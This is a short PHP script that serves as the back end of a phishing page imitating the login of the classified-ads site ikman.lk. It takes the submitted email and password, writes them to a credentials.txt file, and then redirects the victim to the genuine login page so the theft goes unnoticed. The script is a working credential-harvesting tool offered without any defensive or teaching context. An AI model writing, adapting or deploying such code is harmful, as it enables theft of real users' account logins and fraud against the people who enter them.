<?php
	$username = $_POST["email"];
	$password = $_POST["pass"];
	
	echo "$username  : ".$password;
	
	//Write the credentials to text file
 
	$myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
	$txt = "USERNAME = $username , PASSWORD = $password\n";
	fwrite($myfile, "\n". $txt);
	fclose($myfile);

	//Redirect the browser to original login page
	header("Location: http://ikman.lk/en/users/login");
	exit();
?>
	
?>